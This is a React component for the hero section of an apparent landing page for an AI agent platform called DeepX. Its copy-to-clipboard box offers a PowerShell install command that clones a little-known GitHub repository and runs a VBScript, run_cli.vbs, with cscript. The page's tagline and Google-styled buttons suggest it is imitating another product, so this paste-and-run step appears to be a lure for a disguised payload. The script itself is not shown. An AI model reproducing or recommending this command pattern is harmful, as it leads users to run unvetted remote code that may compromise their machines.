import React, { useState, useEffect } from 'react';
import { Monitor, ArrowRight, Copy, Check } from 'lucide-react';

const FULL_TEXT = 'Experience liftoff with the next-gen agent platform';
const PREFIX_TEXT = 'Experience liftoff with the ';

interface HeroSectionProps {
  onTypingComplete?: () => void;
}

export const HeroSection: React.FC<HeroSectionProps> = ({ onTypingComplete }) => {
  const isTest = typeof process !== 'undefined' && process.env?.NODE_ENV === 'test';

  const [typedLength, setTypedLength] = useState(isTest ? FULL_TEXT.length : 0);
  const [typingDone, setTypingDone] = useState(isTest);
  const [copied, setCopied] = useState(false);

  const installCmd = 'git clone https://github.com/supeston/DeepCLI.git && cd DeepCLI && cscript run_cli.vbs';

  useEffect(() => {
    if (isTest) {
      onTypingComplete?.();
      return;
    }

    if (typedLength < FULL_TEXT.length) {
      const nextChar = FULL_TEXT[typedLength];
      const delay = nextChar === ' ' ? 45 : Math.random() * 30 + 22;
      const timer = setTimeout(() => {
        setTypedLength((prev) => prev + 1);
      }, delay);
      return () => clearTimeout(timer);
    } else if (!typingDone) {
      const timer = setTimeout(() => {
        setTypingDone(true);
        onTypingComplete?.();
      }, 150);
      return () => clearTimeout(timer);
    }
  }, [typedLength, typingDone, isTest, onTypingComplete]);

  const handleCopy = () => {
    navigator.clipboard.writeText(installCmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const typedPrefix = FULL_TEXT.slice(0, Math.min(typedLength, PREFIX_TEXT.length));
  const typedSuffix = typedLength > PREFIX_TEXT.length ? FULL_TEXT.slice(PREFIX_TEXT.length, typedLength) : '';

  return (
    <section className="relative min-h-[100dvh] md:min-h-screen flex flex-col justify-center items-center pt-20 pb-12 sm:pt-36 sm:pb-24 overflow-hidden">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 w-full my-auto">
        <div className="text-center max-w-4xl mx-auto">
          {/* 1. Centered Brand Artwork */}
          <div
            className={`flex items-center justify-center gap-3 mb-3 sm:mb-6 transition-all duration-600 ease-out delay-[600ms] ${
              typingDone
                ? 'opacity-100 translate-y-0'
                : 'opacity-0 -translate-y-6 pointer-events-none'
            }`}
          >
            <img
              src="full_logo.png"
              alt="DeepX"
              className="h-8 sm:h-12 w-auto object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).src = 'logo.png';
              }}
            />
          </div>

          {/* 2. Main Headline with Live Human Typing */}
          <h1 className="text-3xl sm:text-6xl lg:text-7xl font-normal tracking-tight text-[#1F1F1F] mb-6 sm:mb-10 leading-[1.12] min-h-[1.2em]">
            <span>{typedPrefix}</span>
            {typedSuffix && <span className="font-medium">{typedSuffix}</span>}
            {!typingDone && (
              <span className="inline-block w-[3px] h-[0.9em] bg-[#536DFE] ml-1.5 translate-y-1 animate-pulse" />
            )}
          </h1>

          {/* 3. Action CTAs */}
          <div className="flex flex-col sm:flex-row items-center justify-center gap-3 sm:gap-4 mb-6 sm:mb-12">
            {/* Download for Windows */}
            <button
              onClick={() => document.getElementById('download')?.scrollIntoView({ behavior: 'smooth' })}
              className={`w-full sm:w-auto google-btn-primary px-6 sm:px-8 py-3 sm:py-3.5 text-sm font-medium cursor-pointer transition-all duration-600 ease-out delay-[750ms] ${
                typingDone
                  ? 'opacity-100 translate-y-0'
                  : 'opacity-0 translate-y-6 pointer-events-none'
              }`}
              data-testid="hero-primary-cta"
            >
              <Monitor className="w-4 h-4" />
              <span>Download for Windows</span>
            </button>

            {/* Explore platform */}
            <button
              onClick={() => document.getElementById('terminal')?.scrollIntoView({ behavior: 'smooth' })}
              className={`w-full sm:w-auto google-btn-secondary px-6 sm:px-8 py-3 sm:py-3.5 text-sm font-medium cursor-pointer transition-all duration-600 ease-out delay-[900ms] ${
                typingDone
                  ? 'opacity-100 translate-y-0'
                  : 'opacity-0 translate-y-6 pointer-events-none'
              }`}
            >
              <span>Explore platform</span>
              <ArrowRight className="w-4 h-4 text-gray-500" />
            </button>
          </div>

          {/* 4. 1-Click Code Box with Smooth Border Beam on Copy */}
          <div
            className={`max-w-xl mx-auto mb-2 sm:mb-4 transition-all duration-600 ease-out delay-[1050ms] ${
              typingDone
                ? 'opacity-100 translate-y-0'
                : 'opacity-0 translate-y-6 pointer-events-none'
            }`}
          >
            <div
              className={`relative flex items-center justify-between p-3 sm:p-3.5 pl-4 sm:pl-5 rounded-2xl bg-white border border-gray-200 transition-all duration-300 ${
                copied
                  ? 'border-[#536DFE]/60 shadow-xl shadow-[#536DFE]/20'
                  : 'shadow-lg shadow-gray-200/50'
              }`}
            >
              {/* Animated SVG Border Beam */}
              {copied && (
                <svg
                  className="absolute inset-0 w-full h-full pointer-events-none rounded-2xl z-20"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <defs>
                    <linearGradient id="copy-beam-grad" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#536DFE" stopOpacity="1" />
                      <stop offset="60%" stopColor="#38BDF8" stopOpacity="1" />
                      <stop offset="100%" stopColor="#536DFE" stopOpacity="0.2" />
                    </linearGradient>
                  </defs>
                  <rect
                    x="1"
                    y="1"
                    width="calc(100% - 2px)"
                    height="calc(100% - 2px)"
                    rx="16"
                    fill="none"
                    stroke="url(#copy-beam-grad)"
                    strokeWidth="2.5"
                    pathLength="100"
                    className="animate-copy-beam"
                  />
                </svg>
              )}

              <div className="flex items-center gap-2.5 sm:gap-3 overflow-hidden text-[11px] sm:text-xs font-mono text-gray-600">
                <span className="text-[#536DFE] select-none font-bold">PS&gt;</span>
                <span className="truncate">{installCmd}</span>
              </div>
              <button
                onClick={handleCopy}
                className="ml-2.5 sm:ml-3 p-1.5 sm:p-2 rounded-xl bg-gray-50 hover:bg-gray-100 text-gray-500 hover:text-gray-900 border border-gray-200 transition-colors flex items-center gap-1.5 text-xs font-medium cursor-pointer shrink-0 z-30"
                aria-label="Copy install command"
                data-testid="hero-copy-cmd-btn"
              >
                {copied ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-[#34A853]" />
                    <span className="text-[#34A853]">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
